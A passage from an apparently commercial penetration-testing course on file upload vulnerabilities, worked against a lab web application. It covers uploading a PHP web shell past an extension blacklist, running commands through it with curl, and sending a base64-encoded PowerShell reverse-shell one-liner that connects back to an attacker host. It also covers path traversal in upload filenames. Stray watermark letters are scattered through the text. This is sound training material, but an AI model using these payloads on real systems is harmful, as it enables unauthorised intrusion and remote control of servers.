kinds of file upload vulnerabilities in this Learning Uonit.
9.3.1 Using Executable Files
n
In this section we will review a file upload vulnerability that enables us to upload files to be run by
the web server. As with Directory Traversal and File Inclusion vulnerabilities, we should
i
understand how to identify File Upload vulnerabilities.
z
Depending on the web application and its usage, we can make educated guesses to locate upload
mechanisms. If the web aDpplication is a Content Management System (CMS),429 we can often
upload an avatar for our profile or create blog posts and web pages with attached files. If our
target is a company website, we can often find upload mechanisms in career sections or
company-specific use cases. For example, if the target website belongs to a lawyer’s office, there
may be an upload mechanism for case files. Sometimes the file upload mechanisms are not
obvious to users, so we should never skip the enumeration phase when working with a web
application.
In this example, we will abuse a file upload mechanism to achieve code execution and obtain a
reverse shell. Let’s review the “Mountain Desserts” web application on the MOUNTAIN VM. We’ll
open up Firefox and navigate to http://192.168.50.189/meteor/.
424 (OWASP, 2022), https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
425 (OWASP, 2022), https://owasp.org/www-community/attacks/xss/
426 (Mozilla Developer Network, 2022), https://developer.mozilla.org/en-US/docs/Web/SVG
427 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/openspecs/office_standards/ms-docx/
428 (Microsoft Support, 2022), https://support.microsoft.com/en-us/office/macros-in-office-files-12b036fd-d140-4e74-b45e-
16fed1a7e5c6
429 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Content_management_system
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 269
Made in Morocco
Penetration Testing with Kali Linux
y
Figure 134: Updated “Mountain Desserts” Web Application
k
Figure 134 shows that in the new version of the “Mountain Desserts” app, the Admin link has been
replaced by an upload form. The text explains that we can upload a picture to win a contest. The
s
tab bar also shows an XAMPP icon displayed in the current tab, indicating the web application is
likely running the XAMPP stack. The text explains that the company wanted to switch to
o
Windows, so we can assume that the web application is now running on a Windows system. Let’s
find out if we can upload a text file instead of an image.
n
kali@kali:~$ echo "this is a test" > test.txt
Listing 156 - Create a test text file
i
Let’s upload the test file to the web application via the upload form in the browser.
z
D
Figure 135: Successful Upload of test.txt
Figure 135 shows that we successfully uploaded our text file, so we know that the upload
mechanism is not limited to images only. Next, let’s attempt to upload the simple-backdoor.php
webshell used in the previous Learning Unit.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 270
Made in Morocco
Penetration Testing with Kali Linux
Figure 136: Failed Upload of simple-backdoor.php
Figure 136 shows that the web application blocked our upload, stating that PHP files are not
allowed and files with PHP file extensions are blacklisted. Since don’t know exactly how the filter
is implemented, we’ll use a trial-and-error approach to find ways to bypass it.
One method to bypass this filter is to change the file extension to a lyess-commonly used PHP file
extension430 such as .phps or .php7. This may allow us to bypass simple filters that only check for
the most common file extensions, .php and .phtml. These altekrnative file extensions were mostly
used for older versions of PHP or specific use cases, but are still supported for compatibility in
modern PHP versions.
s
Another way we can bypass the filter is by changing characters in the file extension to upper
case. The blacklist may be implemented by compoaring the file extension of the uploaded file to a
list of strings containing only lower-case PHP file extensions. If so, we can update the uploaded
file extension with upper-case characters to bypass the filter.
n
Let’s try the second method, updating our simple-backdoor.php file extension from .php to .pHP.
After renaming the file either in the terminal or file explorer, we’ll upload it via the web form.
i
z
D
Figure 137: Successful Upload of simple-backdoor.pHP
This small change allowed us to bypass the filter and upload the file. Let’s confirm if we can use it
to execute code as we did in the RFI section. The output shows that our file was uploaded to the
“uploads” directory, so we can assume there is a directory named “uploads”.
Let’s use curl to provide dir as a command for the “cmd” parameter of our uploaded web shell.
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
Directory of C:\xampp\htdocs\meteor\uploads
04/04/2022 06:23 AM  .
04/04/2022 06:23 AM  ..
04/04/2022 06:21 AM 328 simple-backdoor.pHP
430 (Github, 2016), https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 271
Made in Morocco
Penetration Testing with Kali Linux
04/04/2022 06:03 AM 15 test.txt
2 File(s) 343 bytes
2 Dir(s) 15,410,925,568 bytes free
...
Listing 157 - Execution of dir command in the uploaded webshell
Listing 157 shows us the output of the dir command, confirming we can now execute commands
on the target system. Although this bypass was quick and basic, these kinds of bypasses are
often highly effective.
Let’s wrap up this section by obtaining a reverse shell from the target machine. We’ll start a
Netcat listener in a new terminal to catch the incoming reverse shell on port 4444.
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
y
Listing 158 - Starting Netcat listener on port 4444
Let’s use a PowerShell one-liner431 for our reverse shell. Since tkhere are several special characters
in the reverse shell one-liner, we will encode the string with base64. We can use PowerShell432 or
an online converter433 to perform the encoding. s
In this demonstration, we’ll use PowerShell on our Kali machine to encode the reverse shell one-
o
liner. First, let’s create the variable $Text, which will be used for storing the reverse shell one-liner
as a string. Then, we can use the method convert434 and the property Unicode435 from the class
Encoding436 to encode the contents of the $nText variable.
kali@kali:~$ pwsh
PowerShell 7.1.3 i
Copyright (c) Microsoft Corporzation.
https://aka.ms/powershell
Type 'help' to get help. D
PS> $Text = '$client = New-Object
System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
431 (Github, 2022), https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
432 (Active Directory Security, 2014), https://adsecurity.org/?p=478
433 (Base64Encode, 2022), https://www.base64encode.org/
434 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding.convert
435 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding.unicode
436 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 272
Made in Morocco
Penetration Testing with Kali Linux
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
MAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
PS> exit
Listing 159 - Encoding the oneliner in PowerShell on Linux
As shown in Listing 159, the $EncodedText variable contains the encoded reverse shell one-liner.
Let’s use curl to execute the encoded one-liner via the uploaded siymple-backdoor.pHP. We can
add the base64 encoded string for the powershell command using the -enc437 parameter. We’ll
also need to use URL encoding for the spaces.
k
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-
backdoor.pHP?cmd=powershell%20- s
enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
dAAuAFMAbwBjAGsAZQB0
... o
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
n
Listing 160 - Using curl to send the base64 encoded reverse shell oneliner
i
After executing the command, we should receive an incoming reverse shell in the second terminal
where Netcat is listening. z
kali@kali:~$ nc -nvlp 444D4
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0 2:
Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 192.168.50.189
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
PS C:\xampp\htdocs\meteor\uploads> whoami
nt authority\system
Listing 161 - Incoming reverse shell
437 (Microsoft Documentation, 2020), https://docs.microsoft.com/en-
us/powershell/module/microsoft.powershell.core/about/about_powershell_exe
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 273
Made in Morocco
Penetration Testing with Kali Linux
Listing 161 shows that we received a reverse shell through the base64 encoded reverse shell one-
liner. Great!
In this section, we have demonstrated how to abuse a file upload mechanism in a PHP web
application. We achieved code execution by uploading a web shell from our Kali system. If the
target web application was using ASP instead of PHP, we could have used the same process to
obtain code execution as we did in the previous example, instead uploading an ASP web shell.
Fortunately for us, Kali already contains a broad variety of web shells covering the frameworks
and languages we discussed previously located in the /usr/share/webshells/ directory.
kali@kali:~$ ls -la /usr/share/webshells
total 40
drwxr-xr-x 8 root root 4096 Feb 11 02:00 .
drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
drwxr-xr-x 2 root root 4096 Feb 11 01:58 asp
y
drwxr-xr-x 2 root root 4096 Apr 25 07:25 aspx
drwxr-xr-x 2 root root 4096 Feb 11 01:58 cfm
drwxr-xr-x 2 root root 4096 Apr 25 07:06 jsp k
lrwxrwxrwx 1 root root 19 Feb 11 02:00 laudanum -> /usr/share/laudanum
drwxr-xr-x 2 root root 4096 Feb 11 01:58 perl
s
drwxr-xr-x 3 root root 4096 Feb 11 01:58 php
Listing 162 - Listing of the woebshells directory on Kali
Listing 162 shows us the frameworks and languages for which Kali already offers web shells. It is
important to understand that while the inmplementation of a web shell is dependent on the
programming language, the basic process of using a web shell is nearly identical across these
frameworks and languages. After we identify the framework or language of the target web
i
application, we need to find a way to upload our web shell. The web shell needs to be placed in a
z
location where we can access it. Next, we can provide commands to it, which are executed on the
underlying system.
D
We should be aware that the file types of our web shells may be blacklisted via a filter or upload
mechanism. In situations like this, we can try to bypass the filter as in this section. However, there
are other options to consider. Web applications handling and managing files often enable users
to rename or modify files. We could abuse this by uploading a file with an innocent file type like
.txt, then changing the file back to the original file type of the web shell by renaming it.
9.3.2 Using Non-Executable Files
In this section, we’ll examine why flaws in file uploads can have severe consequences even if
there is no way for an attacker to execute the uploaded files. We may encounter scenarios where
we find an unrestricted file upload mechanism, but cannot exploit it. One example for this is
Google Drive,438 where we can upload any file, but cannot leverage it to get system access. In
situations such as this, we need to leverage another vulnerability such as Directory Traversal to
abuse the file upload mechanism.
Let’s begin to explore the updated “Mountain Desserts” web application by navigating to
http://mountaindesserts.com:8000.
438 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Google_Drive
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 274
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
Figure 138: Mountain Desserts Application on Windows
o
We’ll first notice that new version of the web application still allows us to upload files. The text
also reveals that this version of the application is running on Linux. Furthermore, there is no
Admin link at the bottom of the page, annd index.php is missing in the URL. Let’s use curl to
confirm whether the admin.php and index.php files still exist.
i
kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
z
404 page not found
kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
D
404 page not found
kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
404 page not found
Listing 163 - Failed attempts to access PHP files
Listing 163 shows that the index.php and admin.php files no longer exist in the web application.
We can safely assume that the web server is no longer using PHP. Let’s try to upload a text file.
We’ll start Burp to capture the requests and use the form on the web application to upload the
test.txt file from the previous section.
Figure 139: Text file successfully uploaded
Figure 139 shows that the file was successfully uploaded according to the web application’s
output.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 275
Made in Morocco
Penetration Testing with Kali Linux
When testing a file upload form, we should always determine what happens
when a file is uploaded twice. If the web application indicates that the file already
exists, we can use this method to brute force the contents of a web server.
Alternatively, if the web application displays an error message, this may provide
valuable information such as the programming language or web technologies in
use.
Let’s review the test.txt upload request in Burp. We’ll select the POST request in HTTP history,
send it to Repeater, and click on Send.
y
k
s
o
n
i
z
Figure 140: POST request for the file upload of test.txt in Burp
Figure 140 shows we receive the same output as we did in the browser, without any new or
D
valuable information. Next, let’s check if the web application allows us to specify a relative path in
the filename and write a file via Directory Traversal outside of the web root. We can do this by
modifying the “filename” parameter in the request so it contains ../../../../../../../test.txt, then click
send.
Figure 141: Relative path in filename to upload file outside of web root
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 276
Made in Morocco
Penetration Testing with Kali Linux
The Response area shows us that the output includes the ../ sequences. Unfortunately, we have
no way of knowing if the relative path was used for placing the file. It’s possible that the web
application’s response merely echoed our filename and sanitized it internally. For now, let’s
assume the relative path was used for placing the file, since we cannot find any other attack
vector. If our assumption is correct, we can try to blindly overwrite files, which may lead us to
system access. We should be aware, that blindly overwriting files in a real-life penetration test
could result in lost data or costly downtime of a production system. Before moving forward, let’s
briefly review web server accounts and permissions.
Web applications using Apache, Nginx or other dedicated web servers often run with specific
users, such as www-data on Linux. Traditionally on Windows, the IIS web server runs as a
Network Service account, a passwordless built-in Windows identity with low privileges. Starting
with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities.439 These are virtual
accounts running web applications grouped by application pools.440 Each application pool has its
y
own pool identity, making it possible to set more precise permissions for accounts running web